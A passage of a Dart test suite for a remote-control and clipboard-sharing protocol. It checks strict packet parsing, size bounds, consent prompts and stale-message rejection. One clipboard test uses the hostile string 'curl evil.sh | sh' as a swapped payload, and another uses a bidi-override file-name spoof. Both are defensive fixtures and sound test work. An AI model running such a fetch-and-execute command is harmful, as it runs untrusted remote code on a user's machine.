        '{"v":1 "t":"end"}',
        '{"v":1,"t":"end"} false',
        '{"v":1,"t":"end"}\u00a0',
        r'{"v":1,"\u0076":1,"t":"end"}',
        for (final number in [
          '01',
          '+1',
          '.1',
          '1.',
          '1e',
          '1e+',
          '-',
          'NaN',
          'Infinity',
          '-Infinity',
          '1e9999',
        ])
          inputPacket('["m",$number,0.5]'),
        inputPacket(r'["t","\x41"]'),
        inputPacket(r'["t","\u12"]'),
        inputPacket(r'["t","\u12xz"]'),
        inputPacket('["t","raw\nline"]'),
        inputPacket('["t","unterminated]'),
        inputPacket('["m",0.5,0.5,]'),
        inputPacket('["k",65,tru]'),
      ];
      for (final packet in invalid) {
        expect(
          RemoteControlProtocol.parse(
            packet,
            RemoteControlWireDirection.controllerToControllee,
          ),
          isNull,
          reason: packet,
        );
      }
      final valid = RemoteControlProtocol.parse(
        inputPacket(
          r'["m",2.5e-1,7.5E-1],'
          r'["t","hello\n\t\r\"\\\/\u2603\ud83d\ude00"]',
        ),
        RemoteControlWireDirection.controllerToControllee,
      );
      expect(valid, isNotNull);
      final events = valid!.fields['events'] as List<RemoteInputEvent>;
      expect((events.first as RemoteMoveEvent).x, .25);
      expect((events.last as RemoteTextEvent).text, 'hello\n\t\r"\\/☃😀');
      for (final number in [
        double.nan,
        double.infinity,
        double.negativeInfinity,
      ]) {
        for (final event in [
          RemoteMoveEvent(number, .5),
          RemoteMoveEvent(.5, number),
        ]) {
          expect(
            () => RemoteControlProtocol.input(
              token: _token,
              epoch: 7,
              sequence: 9,
              sourceRevision: 4,
              events: [event],
            ),
            throwsA(
              anyOf(isA<ArgumentError>(), isA<JsonUnsupportedObjectError>()),
            ),
          );
        }
      }
    });

    test('nested and incomplete packets fail within the packet budget', () {
      expect(RemoteControlProtocol.maxJsonDepth, 20);
      for (final levels in [19, 20, 21, 200]) {
        final source = '${'{"a":' * (levels - 1)}0${'}' * (levels - 1)}';
        if (levels <= 20) {
          expect(
            () => RemoteControlJsonValidator(source).validate(),
            returnsNormally,
          );
        } else {
          expect(
            () => RemoteControlJsonValidator(source).validate(),
            throwsFormatException,
          );
        }
      }
      for (final depth in [19, 20, 21, 200]) {
        for (final nested in [
          '${'[' * depth}0${']' * depth}',
          '${'{"a":' * depth}0${'}' * depth}',
          '${'[' * depth}0',
        ]) {
          final packet = '{"v":1,"t":"end","extra":$nested}';
          expect(utf8.encode(packet).length, lessThan(6000));
          expect(
            RemoteControlProtocol.parse(
              packet,
              RemoteControlWireDirection.controllerToControllee,
            ),
            isNull,
          );
        }
      }
    });

    test('emits the C++ canonical request and input vectors', () {
      expect(
        RemoteControlProtocol.request(
          capabilities: const {
            RemoteControlCapability.mouse,
            RemoteControlCapability.keyboard,
          },
          sourceRevision: 4,
          identityColor: 'sage',
        ),
        '{"caps":["mouse","keyboard"],"color":"sage",'
        '"sourceRevision":4,"t":"req","v":1}',
      );
      expect(
        RemoteControlProtocol.input(
          token: _token,
          epoch: 7,
          sequence: 9,
          sourceRevision: 4,
          events: const [
            RemoteMoveEvent(.25, .75),
            RemoteButtonEvent(RemoteMouseButton.left, down: true),
          ],
        ),
        '{"epoch":7,"ev":[["m",0.25,0.75],["d","left"]],'
        '"seq":9,"sourceRevision":4,"t":"input",'
        '"token":"$_token","v":1}',
      );
      expect(
        RemoteControlProtocol.input(
          token: _token,
          epoch: 7,
          sequence: 10,
          sourceRevision: 4,
          events: const [RemoteActionEvent(RemoteGlobalAction.back)],
        ),
        '{"epoch":7,"ev":[["a","back"]],"seq":10,'
        '"sourceRevision":4,"t":"input","token":"$_token","v":1}',
      );
    });

    test(
      'packet bound matches the native firewall so nothing drops silently',
      () {
        // remote_control_protocol.h kMaxPacketBytes, jami_bridge.cpp
        // kMaxTypedCallMessageBytes and JamiCore.kt MAX_TYPED_CALL_MESSAGE_BYTES
        // are all 6000. A larger Dart bound does not widen anything - it just
        // lets Dart build packets the send firewall discards without telling
        // anyone, which is how an oversized clipboard paste disappears.
        expect(RemoteControlProtocol.maxPacketBytes, 6000);

        // A packet that is valid in every other respect - real type, real
        // fields, within the 64-event and 256-byte-per-text limits - and is
        // rejected only for its size. Padding an unknown field would not prove
        // this: the strict parser rejects unknown fields regardless of length.
        // Built by hand because the serializer already refuses to emit an
        // oversized packet, which is exactly why the old 6144 bound leaked:
        // Dart emitted 6001..6144-byte packets happily and native dropped them.
        // Sized to land in 6001..6143: accepted under the old 6144 bound,
        // rejected under the native 6000 one. That gap is the whole defect.
        final events = List.generate(
          40,
          (_) => '["t","${'x' * 140}"]',
        ).join(',');
        final oversize =
            '{"epoch":7,"ev":[$events],"seq":9,"sourceRevision":4,'
            '"t":"input","token":"$_token","v":1}';
        expect(utf8.encode(oversize).length, greaterThan(6000));
        expect(utf8.encode(oversize).length, lessThan(6144));
        expect(
          RemoteControlProtocol.parse(
            oversize,
            RemoteControlWireDirection.controllerToControllee,
          ),
          isNull,
        );
      },
    );

    test('accepts native vectors and rejects direction/schema drift', () {
      final request = RemoteControlProtocol.parse(
        '{"v":1,"t":"req","caps":["mouse","keyboard"],'
        '"color":"sage","sourceRevision":4}',
        RemoteControlWireDirection.controllerToControllee,
      );
      expect(request?.type, RemoteControlWireType.request);
      expect(
        request?.fields['capabilities'],
        containsAll({
          RemoteControlCapability.mouse,
          RemoteControlCapability.keyboard,
        }),
      );
      expect(request?.fields['identityColor'], 'sage');
      expect(
        RemoteControlProtocol.parse(
          '{"v":1,"t":"req","caps":["mouse"],"color":"amber","sourceRevision":4}',
          RemoteControlWireDirection.controlleeToController,
        ),
        isNull,
      );
      expect(
        RemoteControlProtocol.parse(
          '{"v":1,"v":1,"t":"end"}',
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
      expect(
        RemoteControlProtocol.parse(
          '{"v":1,"t":"end","extra":true}',
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
      expect(
        RemoteControlProtocol.parse(
          '{"v":1,"t":"req","caps":["mouse","mouse"],'
          '"color":"amber","sourceRevision":4}',
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
    });

    test('enforces exact event, UTF-8 and clipboard bounds', () {
      final valid =
          '{"v":1,"t":"input","token":"$_token","epoch":7,"seq":9,'
          '"sourceRevision":4,"ev":[["m",0,1],["d","left"],'
          '["u","left"],["w",-120],["k",65,true],["k",65,false],'
          '["t","héllo"]]}';
      final parsed = RemoteControlProtocol.parse(
        valid,
        RemoteControlWireDirection.controllerToControllee,
      );
      expect(parsed?.type, RemoteControlWireType.input);
      expect((parsed?.fields['events']! as List), hasLength(7));
      expect(
        RemoteControlProtocol.parse(
          valid.replaceFirst('["m",0,1]', '["m",-0.1,1]'),
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
      expect(
        RemoteControlProtocol.parse(
          valid.replaceFirst('["k",65,true]', '["k",256,true]'),
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
      expect(
        () => RemoteControlProtocol.clipboardData(
          id: '0011223344556677',
          sha256Hex: _zeroHash,
          text: 'x' * 4097,
          direction: RemoteControlWireDirection.controllerToControllee,
        ),
        throwsArgumentError,
      );
    });

    test(
      'clipboard consent preview is rune-safe and exposes bidi controls',
      () {
        final binding = const RemoteControlBinding(
          callId: _call,
          peerId: _peer,
          sourceRevision: 4,
        );
        final boundary = RemoteClipboardRequest(
          binding: binding,
          generation: 1,
          id: '0011223344556677',
          text: '${'a' * 159}😀tail',
          receiver: RemoteClipboardReceiver.controller,
        );
        expect(boundary.preview, '${'a' * 159}😀…');
        expect(boundary.preview, isNot(contains('\u{fffd}')));

        const spoofedText = 'invoice\u202Efdp.exe\nnext';
        final spoofed = RemoteClipboardRequest(
          binding: binding,
          generation: 2,
          id: '0011223344556677',
          text: spoofedText,
          receiver: RemoteClipboardReceiver.controller,
        );
        expect(
          spoofed.text,
          spoofedText,
          reason: 'accepted bytes stay unchanged',
        );
        expect(spoofed.preview, r'invoice\u{202E}fdp.exe\u{000A}next');
        expect(spoofed.preview, isNot(contains('\u202e')));
      },
    );
  });

  group('RemoteControlController', () {
    testWidgets('coalesces moves and keeps a discrete click ordered', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      controller
        ..move(.1, .2)
        ..move(.3, .4)
        ..button(RemoteMouseButton.left, down: true);
      await tester.pump();

      expect(transport.inputBatches, hasLength(1));
      expect(transport.inputBatches.single, hasLength(2));
      expect((transport.inputBatches.single.first as RemoteMoveEvent).x, .3);
      expect(
        transport.inputBatches.single.last,
        isA<RemoteButtonEvent>().having((event) => event.down, 'down', true),
      );
      await tester.pump(const Duration(milliseconds: 50));
      expect(transport.inputBatches, hasLength(1));
    });

    testWidgets('revoke and source replacement cancel pending input', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      controller.move(.5, .5);
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload: '{"t":"revoke","v":1}',
      );
      await tester.pump(const Duration(milliseconds: 50));
      expect(transport.inputBatches, isEmpty);
      expect(controller.phase, RemoteControlPhase.ended);

      await _activateAndroid(controller);
      controller.move(.8, .8);
      _sync(controller, peerRevision: 5);
      await tester.pump(const Duration(milliseconds: 50));
      expect(transport.inputBatches, isEmpty);
      expect(
        transport.operations.where((operation) => operation.startsWith('end:')),
        isNotEmpty,
      );
    });

    testWidgets('focus-loss release retires every held key and button', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      controller
        ..key(65, down: true)
        ..button(RemoteMouseButton.left, down: true);
      await tester.pump();
      controller.releaseHeldInputs();
      await tester.pump();

      final events = transport.inputBatches.expand((batch) => batch).toList();
      expect(events.whereType<RemoteKeyEvent>().map((event) => event.down), [
        true,
        false,
      ]);
      expect(events.whereType<RemoteButtonEvent>().map((event) => event.down), [
        true,
        false,
      ]);
    });

    testWidgets('stale call/device messages cannot activate a session', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller);
      await controller.requestControl();

      controller.applyControlleePacket(
        callId: 'old-call',
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"caps":["mouse"],"epoch":1,"sourceRevision":4,'
            '"t":"grant","token":"$_token","v":1}',
      );
      expect(controller.phase, RemoteControlPhase.requesting);

      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: 'too-short',
        payload:
            '{"caps":["mouse"],"epoch":1,"sourceRevision":4,'
            '"t":"grant","token":"$_token","v":1}',
      );
      expect(controller.phase, RemoteControlPhase.requesting);

      controller.applyNativeControllerState({
        'callId': _call,
        'peerJamiId': _peer,
        'peerDeviceId': '',
        'sourceRevision': 4,
        'state': 'requesting',
      });
      expect(controller.phase, RemoteControlPhase.requesting);
      controller.applyNativeControllerState({
        'callId': _call,
        'peerJamiId': _peer,
        'peerDeviceId': _device,
        'sourceRevision': 5,
        'controlCapabilities': 1,
        'state': 'active',
      });
      expect(controller.phase, RemoteControlPhase.requesting);
      controller.dispose();
    });

    testWidgets('Android request expires locally and can be retried', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        requestTimeout: const Duration(milliseconds: 100),
      );
      addTearDown(controller.dispose);
      _sync(controller);

      expect(await controller.requestControl(), isTrue);
      expect(controller.phase, RemoteControlPhase.requesting);
      await tester.pump(const Duration(milliseconds: 101));

      expect(controller.phase, RemoteControlPhase.ended);
      expect(controller.notice, 'Control request timed out.');
      expect(controller.canRequest, isTrue);
      expect(await controller.requestControl(), isTrue);
      expect(controller.phase, RemoteControlPhase.requesting);
      controller.dispose();
    });

    testWidgets('Windows request expires if the native timeout event is lost', (
      tester,
    ) async {
      final transport = _FakeTransport()..nativeAuthority = true;
      final controller = RemoteControlController(
        transport,
        requestTimeout: const Duration(milliseconds: 100),
      );
      addTearDown(controller.dispose);
      _sync(controller);

      expect(await controller.requestControl(), isTrue);
      expect(controller.phase, RemoteControlPhase.requesting);
      await tester.pump(const Duration(milliseconds: 101));

      expect(controller.phase, RemoteControlPhase.ended);
      expect(controller.notice, 'Control request timed out.');
      expect(controller.canRequest, isTrue);
    });

    testWidgets('Android clipboard sends are bounded and expire', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        clipboardTimeout: const Duration(milliseconds: 100),
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      for (var i = 0; i < 8; i++) {
        expect(
          await controller.sendClipboardText('clipboard $i', fromHost: false),
          isTrue,
        );
      }
      expect(
        await controller.sendClipboardText('one too many', fromHost: false),
        isFalse,
      );
      expect(
        controller.notice,
        'Wait for an earlier clipboard transfer to finish.',
      );

      await tester.pump(const Duration(milliseconds: 101));
      expect(controller.notice, 'Clipboard response timed out.');
      expect(
        await controller.sendClipboardText('available again', fromHost: false),
        isTrue,
      );
      controller.dispose();
    });

    testWidgets('Windows accepts its native clipboard correlation id', (
      tester,
    ) async {
      final transport = _FakeTransport()
        ..nativeAuthority = true
        ..nativeClipboard = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateNative(controller);

      expect(
        await controller.sendClipboardText('hello', fromHost: false),
        isTrue,
      );
      controller.applyNativeClipboardResult({
        'callId': _call,
        'id': '1111222233334444',
        'state': 'accepted',
      }, fromHost: false);
      expect(controller.notice, 'Clipboard shared.');

      controller.notice = null;
      controller.applyNativeClipboardResult({
        'callId': 'old-call',
        'id': '1111222233334444',
        'state': 'accepted',
      }, fromHost: false);
      expect(controller.notice, isNull);
    });

    testWidgets('malformed control text fails closed without wedging input', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      expect(
        await controller.sendClipboardText('bad\u0000text', fromHost: false),
        isFalse,
      );
      controller.text('bad\u0000text');
      await tester.pump();
      expect(transport.inputBatches, isEmpty);
      expect(
        transport.operations.where(
          (operation) => operation.startsWith('clipboard:'),
        ),
        isEmpty,
      );

      controller.key(65, down: true);
      await tester.pump();
      expect(transport.inputBatches, hasLength(1));
      expect(transport.inputBatches.single.single, isA<RemoteKeyEvent>());
      expect(controller.phase, RemoteControlPhase.controlling);
    });

    testWidgets('only negotiated input families enter the strict sequence', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller);
      expect(await controller.requestControl(), isTrue);
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"caps":["mouse","text","home"],"epoch":7,'
            '"sourceRevision":4,"t":"grant","token":"$_token","v":1}',
      );

      controller
        ..key(65, down: true)
        ..button(RemoteMouseButton.middle, down: true)
        ..action(RemoteGlobalAction.back);
      expect(
        await controller.sendClipboardText('blocked', fromHost: false),
        isFalse,
      );
      await tester.pump();
      expect(transport.inputBatches, isEmpty);

      controller
        ..move(0.5, 0.5)
        ..click()
        ..text('safe')
        ..action(RemoteGlobalAction.home);
      await tester.pump();
      expect(
        transport.inputBatches.expand((batch) => batch),
        containsAllInOrder(<Matcher>[
          isA<RemoteMoveEvent>(),
          isA<RemoteButtonEvent>(),
          isA<RemoteButtonEvent>(),
          isA<RemoteTextEvent>(),
          isA<RemoteActionEvent>(),
        ]),
      );
      await tester.pump(const Duration(milliseconds: 500));
    });

    testWidgets(
      'Allow and No cannot decide the same host prompt concurrently',
      (tester) async {
        final allow = Completer<bool>();
        final transport = _FakeTransport()
          ..nativeAuthority = true
          ..blockedHostAllow = allow;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        _sync(controller, peerScreen: false, localScreen: true);
        controller.applyNativeHostRequest({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 1,
          'controlCapabilities': 15,
          'persistentAvailable': true,
        });
        final displayed = controller.hostRequest!;

        final accepting = controller.allowHost(
          expectedRequest: displayed,
          persistDevice: false,
        );
        expect(await controller.denyHost(displayed), isFalse);
        expect(transport.operations, ['allow-once']);

        allow.complete(true);
        expect(await accepting, isTrue);
        expect(controller.hostPhase, RemoteControlHostPhase.active);
      },
    );

    testWidgets(
      'a persistent confirmation cannot authorize a successor prompt',
      (tester) async {
        final transport = _FakeTransport()..nativeAuthority = true;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        _sync(controller, peerScreen: false, localScreen: true);
        controller.applyNativeHostRequest({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 1,
          'controlCapabilities': 15,
          'persistentAvailable': true,
        });
        final first = controller.hostRequest!;
        controller.applyNativeHostState({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 1,
          'state': 'denied',
        });
        controller.applyNativeHostRequest({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 2,
          'controlCapabilities': 15,
          'persistentAvailable': true,
        });
        final second = controller.hostRequest!;
        expect(second.persistentAvailable, isFalse);
        expect(
          await controller.allowHost(
            expectedRequest: second,
            persistDevice: true,
          ),
          isFalse,
        );

        expect(
          await controller.allowHost(
            expectedRequest: first,
            persistDevice: true,
          ),
          isFalse,
        );
        expect(controller.hostRequest, same(second));
        expect(transport.operations, isEmpty);
      },
    );

    testWidgets(
      'persistent native activation projects and tears down exactly',
      (tester) async {
        final transport = _FakeTransport()..nativeAuthority = true;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        _sync(controller, peerScreen: false, localScreen: true);

        controller.applyNativeHostState({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 7,
          'state': 'active',
          'coControl': true,
          'hotkeyAvailable': false,
        });
        expect(controller.hostRequest, isNull);
        expect(controller.hostPhase, RemoteControlHostPhase.active);
        expect(controller.coControl, isTrue);
        expect(controller.hotkeyAvailable, isFalse);

        // A delayed terminal event for another receiver generation cannot clear
        // the persistent session that is actually projected.
        controller.applyNativeHostState({
          'callId': _call,
          'controllerAccountId': _peer,
          'controllerDeviceId': _device,
          'sourceRevision': 9,
          'hostGeneration': 6,
          'state': 'ended',
        });
        expect(controller.hostPhase, RemoteControlHostPhase.active);
        expect(controller.coControl, isTrue);

        _sync(controller, peerScreen: false, localScreen: false);
        expect(controller.hostPhase, RemoteControlHostPhase.revoking);
        await tester.pump();
        expect(controller.hostPhase, RemoteControlHostPhase.idle);
        expect(controller.coControl, isFalse);
        expect(controller.hotkeyAvailable, isNull);
      },
    );

    testWidgets('stale native host lifecycle cannot replace a newer source', (
      tester,
    ) async {
      final transport = _FakeTransport()
        ..nativeAuthority = true
        ..nativeClipboard = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true, localRevision: 9);
      controller.applyNativeHostRequest({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'controlCapabilities': 15,
        'persistentAvailable': true,
      });
      expect(controller.hostPhase, RemoteControlHostPhase.prompting);

      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 8,
        'hostGeneration': 1,
        'state': 'active',
      });
      expect(controller.hostPhase, RemoteControlHostPhase.prompting);

      _sync(
        controller,
        peerScreen: false,
        localScreen: true,
        localRevision: 10,
      );
      controller.applyNativeHostRequest({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 10,
        'hostGeneration': 2,
        'controlCapabilities': 15,
        'persistentAvailable': true,
      });
      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'ended',
      });
      expect(controller.hostPhase, RemoteControlHostPhase.prompting);
      expect(controller.hostRequest?.binding.sourceRevision, 10);
    });

    testWidgets('a missing hotkeyAvailable field never re-claims the kill '
        'switch', (tester) async {
      final transport = _FakeTransport()..nativeAuthority = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true, localRevision: 9);
      controller.applyNativeHostRequest({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'controlCapabilities': 15,
        'persistentAvailable': true,
      });
      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'active',
        'hotkeyAvailable': false,
      });
      expect(controller.hostPhase, RemoteControlHostPhase.active);
      expect(controller.hotkeyAvailable, isFalse);
      // Before any lifecycle event the answer is unknown, not "unavailable":
      // the warning must stay silent rather than fire on every healthy session.
      final fresh = RemoteControlController(_FakeTransport());
      addTearDown(fresh.dispose);
      expect(fresh.hotkeyAvailable, isNull);

      // Native attaches the flag only on lifecycle events; arbitration and
      // host-priority omit it. Absence must mean "unchanged", never "true" —
      // reading it as good news silently re-claimed a kill switch that had
      // failed to register (M10 audit 2026-07-27).
      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'arbitration',
        'coControl': true,
      });
      expect(controller.hotkeyAvailable, isFalse);

      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'host-priority',
      });
      expect(controller.hotkeyAvailable, isFalse);

      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'active',
        'hotkeyAvailable': true,
      });
      expect(controller.hotkeyAvailable, isTrue);

      // Session end returns it to unanswered, so the next session cannot
      // inherit either a stale confirmation or a stale warning.
      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'state': 'ended',
      });
      expect(controller.hotkeyAvailable, isNull);
    });

    testWidgets('throwing best-effort teardowns do not escape asynchronously', (
      tester,
    ) async {
      final transport = _FakeTransport()
        ..throwingOperations.addAll({'deny-host', 'stop-host', 'end'});
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);

      _sync(controller, peerScreen: false, localScreen: true);
      controller.applyNativeHostRequest({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 9,
        'hostGeneration': 1,
        'controlCapabilities': 15,
        'persistentAvailable': true,
      });
      _sync(
        controller,
        peerScreen: false,
        localScreen: true,
        localRevision: 10,
      );

      controller.applyNativeHostRequest({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 10,
        'hostGeneration': 2,
        'controlCapabilities': 15,
        'persistentAvailable': true,
      });
      controller.applyNativeHostState({
        'callId': _call,
        'controllerAccountId': _peer,
        'controllerDeviceId': _device,
        'sourceRevision': 10,
        'hostGeneration': 2,
        'state': 'active',
      });
      _sync(
        controller,
        peerScreen: false,
        localScreen: true,
        localRevision: 11,
      );

      await _activateAndroid(controller);
      _sync(controller, peerRevision: 5);
      await tester.pump();

      expect(controller.phase, RemoteControlPhase.ended);
      expect(controller.hostPhase, RemoteControlHostPhase.revoking);
      expect(tester.takeException(), isNull);
    });

    testWidgets('clipboard consent is bound to received bytes and hash', (
      tester,
    ) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);
      const id = '0011223344556677';
      const text = 'hello sibling';
      final hash = sha256.convert(utf8.encode(text)).toString();

      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
            '"t":"clip-offer","v":1}',
      );
      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"$id","sha256":"$hash","t":"clip-data",'
            '"text":"different","v":1}',
      );
      expect(controller.clipboardRequest, isNull);

      controller.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload:
            '{"id":"$id","sha256":"$hash","t":"clip-data",'
            '"text":"$text","v":1}',
      );
      expect(controller.clipboardRequest?.text, text);
      final request = controller.clipboardRequest!;
      var written = '';
      expect(
        await controller.acceptClipboard(
          (value) async => written = value,
          expectedRequest: request,
        ),
        isTrue,
      );
      expect(written, text);
      expect(
        transport.operations,
        contains('clipboard-response:controller:accept:$id'),
      );
    });

    testWidgets('a displayed clipboard prompt cannot be swapped under the '
        'user', (tester) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      Future<void> offer(String id, String text) async {
        final hash = sha256.convert(utf8.encode(text)).toString();
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
              '"t":"clip-offer","v":1}',
        );
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","t":"clip-data",'
              '"text":"$text","v":1}',
        );
      }

      const benign = 'meeting link';
      const swapped = 'curl evil.sh | sh';
      await offer('00112233445566aa', benign);
      expect(controller.clipboardRequest?.text, benign);

      // The peer immediately follows with different text under a new id,
      // aiming to have it under the finger when the tap lands.
      await offer('00112233445566bb', swapped);
      expect(
        controller.clipboardRequest?.text,
        benign,
        reason: 'the rendered prompt must survive a second offer',
      );

      // ...and REUSING the displayed id must not work either. An earlier
      // version of this guard compared ids and allowed same-id re-delivery,
      // which was a bypass, not a convenience.
      await offer('00112233445566aa', swapped);
      expect(
        controller.clipboardRequest?.text,
        benign,
        reason: 'a same-id second offer must not replace the rendered prompt',
      );

      // The native-correlated path (Windows) shares the guard and must hold
      // under the same id too — it has no offer/data split to lean on.
      controller.applyNativeClipboardRequest({
        'callId': _call,
        'peerJamiId': _peer,
        'peerDeviceId': _device,
        // Revision 4: _activateAndroid binds 4, and a mismatch here would make
        // matchesEnvelope reject the request for an unrelated reason — the
        // assertion below would pass with the guard deleted.
        'sourceRevision': 4,
        'id': '00112233445566aa',
        'promptGeneration': 41,
        'text': swapped,
        'clipboardBytes': utf8.encode(swapped).length,
      }, forController: true);
      expect(
        controller.clipboardRequest?.text,
        benign,
        reason: 'the native path must also refuse a same-id replacement',
      );

      var written = '';
      final request = controller.clipboardRequest!;
      expect(
        await controller.acceptClipboard(
          (value) async => written = value,
          expectedRequest: request,
        ),
        isTrue,
      );
      // Consent applies to what was on screen, never the late arrival.
      expect(written, benign);
      expect(
        transport.operations,
        contains('clipboard-response:controller:accept:00112233445566aa'),
      );
    });

    testWidgets('an ignored clipboard prompt expires instead of blocking the '
        'session', (tester) async {
      final transport = _FakeTransport();
      final controller = RemoteControlController(
        transport,
        secureRandom: Random(7),
      );
      addTearDown(controller.dispose);
      await _activateAndroid(controller);

      Future<void> offer(String id, String text) async {
        final hash = sha256.convert(utf8.encode(text)).toString();
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","size":${utf8.encode(text).length},'
              '"t":"clip-offer","v":1}',
        );
        controller.applyControlleePacket(
          callId: _call,
          peerId: _peer,
          peerDeviceId: _device,
          payload:
              '{"id":"$id","sha256":"$hash","t":"clip-data",'
              '"text":"$text","v":1}',
        );
      }

      await offer('00112233445566cc', 'first');
      expect(controller.clipboardRequest?.text, 'first');

      // The user never answers. The sender gives up on the same deadline, so
      // our prompt must not outlive it — otherwise refusing to swap a live
      // prompt would wedge the session's clipboard forever.
      await tester.pump(const Duration(seconds: 21));
      expect(controller.clipboardRequest, isNull);

      // And the next offer is accepted normally.
      await offer('00112233445566dd', 'second');
      expect(controller.clipboardRequest?.text, 'second');

      // Its own deadline applies too — the expiry is per prompt, not one-shot.
      await tester.pump(const Duration(seconds: 21));
      expect(controller.clipboardRequest, isNull);
    });

    testWidgets(
      'clipboard admission is bounded and retains terminal ids for the grant',
      (tester) async {
        final transport = _FakeTransport();
        final controller = RemoteControlController(
          transport,
          secureRandom: Random(7),
        );
        addTearDown(controller.dispose);
        await _activateAndroid(controller);
        final hash = sha256.convert(utf8.encode('x')).toString();
        void packet(String id, String type) {
          controller.applyControlleePacket(
            callId: _call,
            peerId: _peer,
            peerDeviceId: _device,
            payload: jsonEncode({
              'v': 1,
              't': type,
              'id': id,
              'sha256': hash,
              if (type == 'clip-offer') 'size': 1 else 'text': 'x',
            }),
          );
        }

        for (var index = 0; index < 64; index++) {
          final id = index.toRadixString(16).padLeft(16, '0');
          packet(id, 'clip-offer');
          packet(id, 'clip-data');
          final request = controller.clipboardRequest!;
          packet(id, 'clip-data');
          expect(controller.clipboardRequest, same(request));
          await controller.rejectClipboard(expectedRequest: request);
          packet(id, 'clip-offer');
          packet(id, 'clip-data');
          expect(controller.clipboardRequest, isNull);
